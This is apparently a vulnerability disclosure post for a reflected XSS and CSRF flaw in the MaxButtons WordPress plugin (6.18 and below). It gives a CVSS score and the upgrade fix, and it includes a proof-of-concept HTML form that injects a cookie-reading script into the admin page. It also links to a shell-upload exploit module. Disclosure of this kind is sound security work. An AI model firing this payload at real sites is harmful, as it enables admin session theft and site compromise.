---
layout: single
title: MaxButtons <= 6.18 Reflected XSS
date: 2017-06-10
categories:
  - security
  - websec
  - disclosure
tags:
  - wordpress
  - maxbuttons
  - reflected xss
excerpt: Due to a lack of CSRF mitigation and entity encoding in `includes/admin_header.php`, it is possible to execute scripts in the context of an admin user by including a script in the `page` field in a POST request.
---
## Homepage
[https://wordpress.org/plugins/maxbuttons/](https://wordpress.org/plugins/maxbuttons/)

## Overview
Due to a lack of CSRF mitigation and entity encoding in `includes/admin_header.php`, it is possible to execute scripts in the context of an admin user by including a script in the `page` field in a POST request.

## CVSS Score
4.8

## CVSS Vector
[(AV:N/AC:M/Au:N/C:P/I:P/A:N/E:F/RL:OF/RC:C)](https://nvd.nist.gov/vuln-metrics/cvss/v2-calculator?vector=(AV:N/AC:M/Au:N/C:P/I:P/A:N/E:F/RL:OF/RC:C))

## Versions Affected
6.18 and below

## Solution
Upgrade  to version 6.19 or newer

## WordPress Exploit Framework Module
[exploit/xss/reflected/maxbuttons\_reflected\_xss\_shell\_upload](https://github.com/rastating/wordpress-exploit-framework/blob/development/lib/wpxf/modules/exploit/xss/reflected/maxbuttons_reflected_xss_shell_upload.rb)

## Proof of Concept
```xml
<form action="http://[target]/wp-admin/admin.php?page=maxbuttons-controller" method="post">
  <input name="page" type="text" value="&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&lt;div class=&quot;">
  <input type="submit" value="Submit">
</form>
```

## WPVDB-ID
[8831](https://wpvulndb.com/vulnerabilities/8831)
